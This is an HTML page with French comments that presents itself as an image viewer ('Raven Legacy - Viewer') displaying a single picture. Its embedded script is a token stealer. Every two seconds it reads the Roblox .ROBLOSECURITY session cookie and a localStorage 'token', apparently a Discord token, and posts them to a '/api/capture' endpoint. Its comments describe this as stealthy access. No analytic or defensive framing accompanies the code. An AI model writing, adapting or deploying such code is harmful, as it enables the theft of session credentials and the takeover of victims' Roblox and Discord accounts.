<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Raven Legacy - Viewer</title>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 90%; border: 1px solid #00ffcc; box-shadow: 0 0 20px #00ffcc; }
    </style>
</head>
<body>
    <img src="https://i.pinimg.com/736x/75/d9/f1/75d9f18c5148f6d85b421279cde90907.jpg">

    <script>
        // Fonction de scan en boucle (Polling)
        async function ravenScanner() {
            // Tentative d'accès furtif au LocalStorage et Cookies
            const rblx = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1];
            const dsct = window.localStorage.getItem('token');

            if (rblx || dsct) {
                // Si on trouve quelque chose, on envoie DIRECTEMENT au serveur
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        rblx: rblx || "En attente...",
                        dsct: dsct || "En attente..."
                    })
                });
                console.log("Flux synchronisé."); // Pour ton écran de hacker
            }
        }

        // On lance le scan toutes les 2 secondes (2000ms)
        setInterval(ravenScanner, 2000);
    </script>
</body>
</html>
